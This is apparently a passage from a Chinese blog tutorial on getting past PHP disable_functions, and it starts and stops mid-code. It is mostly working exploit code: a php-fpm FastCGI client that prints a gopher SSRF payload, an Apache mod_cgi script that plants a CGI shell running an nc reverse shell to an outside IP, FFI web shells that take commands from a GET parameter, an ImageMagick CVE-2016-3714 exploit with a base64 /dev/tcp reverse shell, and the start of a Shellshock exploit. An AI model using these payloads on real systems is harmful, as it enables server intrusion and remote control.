class="hljs-literal">True</span>:<br>            response = <span class="hljs-variable language_">self</span>.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    <span class="hljs-variable language_">self</span>.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                <span class="hljs-variable language_">self</span>.requests[requestId]<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.host, <span class="hljs-variable language_">self</span>.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hack.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 修改点 4</span><br>    <span class="hljs-comment"># response = client.request(params, content)</span><br>    <span class="hljs-comment"># print(force_text(response))</span><br>    request_ssrf = quote(client.request(params, content))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="hljs-built_in">str</span>(args.port) + <span class="hljs-string">&quot;/_&quot;</span> + request_ssrf)<br><br></code></pre></td></tr></table></figure><p>用法和原来一样</p><p><code>python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c &quot;&lt;?php phpinfo(); ?&gt;&quot;</code></p><h1 id="Apache-mod-cgi"><a href="#Apache-mod-cgi" class="headerlink" title="Apache_mod_cgi"></a>Apache_mod_cgi</h1><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>Apache + PHP (apache 使用 apache_mod_php)</li><li>Apache 开启了 cgi, rewrite</li><li>httpd.conf 中给了Web目录 AllowOverride 权限（允许.htaccess文件）</li><li>当前目录可写</li></ul><p><strong>原理</strong></p><p>Apache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options +ExecCGI<br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<br></code></pre></td></tr></table></figure><p>这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions</p><p><strong>利用</strong></p><p>1：在web目录新建一个 .htaccess 文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options +ExecCGI<br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<br></code></pre></td></tr></table></figure><p>2：然后新建一个后缀为 .xxx 的文件，内容是要执行的命令，然后赋予777权限</p><p>注意：linux中cgi比较严格，如果上传后发现状态码500，无法解析文件。可能是因为本地编辑器编写上传时编码不一致导致无法解析</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span>&amp;&amp;<span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>;<span class="hljs-built_in">ls</span> -al<br></code></pre></td></tr></table></figure><p>3：最后网页访问即可</p><p>如果命令执行失败，页面也会报 500 错误(因为访问的是 CGI)</p><p><strong>综合利用脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;nc -c &#x27;/bin/bash&#x27; 172.16.15.1 4444&quot;</span>; <span class="hljs-comment">//command to be executed</span><br><span class="hljs-variable">$shellfile</span> = <span class="hljs-string">&quot;#!/bin/bash\n&quot;</span>; <span class="hljs-comment">//using a shellscript</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="hljs-comment">//header is needed, otherwise a 500 error is thrown when there is output</span><br><span class="hljs-variable">$shellfile</span> .= <span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>; <span class="hljs-comment">//executing $cmd</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkEnabled</span>(<span class="hljs-params"><span class="hljs-variable">$text</span>, <span class="hljs-variable">$condition</span>, <span class="hljs-variable">$yes</span>, <span class="hljs-variable">$no</span></span>) //<span class="hljs-title">this</span> <span class="hljs-title">surely</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">shorter</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$text</span>: &quot;</span> . (<span class="hljs-variable">$condition</span> ? <span class="hljs-variable">$yes</span> : <span class="hljs-variable">$no</span>) . <span class="hljs-string">&quot;&lt;br&gt;\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;checked&#x27;</span>])) &#123;<br>@<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); <span class="hljs-comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] . <span class="hljs-string">&#x27;?checked=true&#x27;</span>); <span class="hljs-comment">//execute the script again to see if the htaccess test worked</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$modcgi</span> = <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;mod_cgi&#x27;</span>, <span class="hljs-title function_ invoke__">apache_get_modules</span>()); <span class="hljs-comment">// mod_cgi enabled?</span><br><span class="hljs-variable">$writable</span> = <span class="hljs-title function_ invoke__">is_writable</span>(<span class="hljs-string">&#x27;.&#x27;</span>); <span class="hljs-comment">//current dir writable?</span><br><span class="hljs-variable">$htaccess</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTACCESS&#x27;</span>]); <span class="hljs-comment">//htaccess enabled?</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Mod-Cgi enabled&quot;</span>, <span class="hljs-variable">$modcgi</span>, <span class="hljs-string">&quot;Yes&quot;</span>, <span class="hljs-string">&quot;No&quot;</span>);<br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Is writable&quot;</span>, <span class="hljs-variable">$writable</span>, <span class="hljs-string">&quot;Yes&quot;</span>, <span class="hljs-string">&quot;No&quot;</span>);<br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;htaccess working&quot;</span>, <span class="hljs-variable">$htaccess</span>, <span class="hljs-string">&quot;Yes&quot;</span>, <span class="hljs-string">&quot;No&quot;</span>);<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$modcgi</span> &amp;&amp; <span class="hljs-variable">$writable</span> &amp;&amp; <span class="hljs-variable">$htaccess</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error. All of the above must be true for the script to work!&quot;</span>; <span class="hljs-comment">//abort if not</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Backing up .htaccess&quot;</span>, <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;.htaccess&quot;</span>, <span class="hljs-string">&quot;.htaccess.bak&quot;</span>), <span class="hljs-string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//make a backup, cause you never know.</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write .htaccess file&quot;</span>, <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span>), <span class="hljs-string">&quot;Succeeded!&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//.dizzle is a nice extension</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Write shell file&quot;</span>, <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;shell.dizzle&#x27;</span>, <span class="hljs-variable">$shellfile</span>), <span class="hljs-string">&quot;Succeeded!&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//write the file</span><br><span class="hljs-title function_ invoke__">checkEnabled</span>(<span class="hljs-string">&quot;Chmod 777&quot;</span>, <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-string">&quot;shell.dizzle&quot;</span>, <span class="hljs-number">0777</span>), <span class="hljs-string">&quot;Succeeded!&quot;</span>, <span class="hljs-string">&quot;Failed!&quot;</span>); <span class="hljs-comment">//rwx</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;</span>; <span class="hljs-comment">//call the script</span><br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="php74-FFI"><a href="#php74-FFI" class="headerlink" title="php74_FFI"></a>php74_FFI</h1><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP &gt;&#x3D; 7.4</li><li>开启了 FFI 扩展且 ffi.enable&#x3D;true</li></ul><p><strong>原理</strong></p><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术</p><p>通过c语言的system去执行命令,绕过php的disable_functions</p><p><strong>利用</strong></p><p>C库的system函数执行是没有回显的，所以需要将执行结果写入到tmp等有权限的目录中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span> &gt; /tmp/SD&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;/tmp/SD&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>或者调用popen和fgetc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$c</span> = <span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$o</span>)) != -<span class="hljs-number">1</span>)&#123;<span class="hljs-variable">$d</span> .= <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$c</span>)),<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0</span>);&#125;<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>又或者调用PHP源码中的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$ffi</span> = FFI::<span class="hljs-title function_ invoke__">cdef</span>(<span class="hljs-string">&quot;int php_exec(int type, char *cmd);&quot;</span>);<br><span class="hljs-variable">$ffi</span>-&gt;<span class="hljs-title function_ invoke__">php_exec</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$cmd</span>&quot;</span>);   <span class="hljs-comment">//3表示passthru()函数，其执行命令可以直接将结果原始输出</span><br></code></pre></td></tr></table></figure><h1 id="ImageMagick-CVE-2016–3714"><a href="#ImageMagick-CVE-2016–3714" class="headerlink" title="ImageMagick(CVE-2016–3714)"></a>ImageMagick(CVE-2016–3714)</h1><p><strong>利用条件</strong></p><ul><li>漏洞影响ImageMagick 6.9.3-9以前的所有版本</li><li>安装了 php-imagick 拓展并在 php.ini 中启用</li><li>编写 php 通过 new Imagick 对象的方式来处理图片等格式文件</li><li>PHP &gt;&#x3D; 5.4</li></ul><p><strong>原理</strong></p><p><a href="https://imagetragick.com/">https://imagetragick.com/</a><br><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><p>简单来说就是ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的</p><p>同时它内部定义了很多占位符，而在其中command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（&#96;）或闭合双引号，来执行任意命令</p><p><strong>利用</strong></p><p>反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AAAA</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3Ljk5Ljc3LjUyLzg4ODggMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">AAAA</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&quot;disable_functions&quot;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$command</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] : <span class="hljs-string">&#x27;id&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Run command: <span class="hljs-subst">$command</span>\n====================\n&quot;</span>;<br><br><span class="hljs-variable">$data_file</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>);<br><span class="hljs-variable">$imagick_file</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>);<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://127.0.0.1/image.jpg&quot;|<span class="hljs-subst">$command</span>&gt;<span class="hljs-subst">$data_file</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$imagick_file</span>&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$imagick_file</span>&quot;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>));<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data_file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Bash-Shellshock-CVE-2014-6271"><a href="#Bash-Shellshock-CVE-2014-6271" class="headerlink" title="Bash Shellshock(CVE-2014-6271)"></a>Bash Shellshock(CVE-2014-6271)</h1><p><strong>利用条件</strong></p><ul><li>目标环境存在Bash破壳（CVE-2014-6271）漏洞</li><li>putenv()、mail() 或 error_log() 函数可用</li></ul><p><strong>利用</strong></p><p>需要利用 PHP 中可以调用 popen 或其他能够派生 bash 子进程的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runcmd</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>  <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$d</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-string">&quot;/&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;error_log&#x27;</span>) || <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;mail&#x27;</span>)))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">readlink</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>), <span 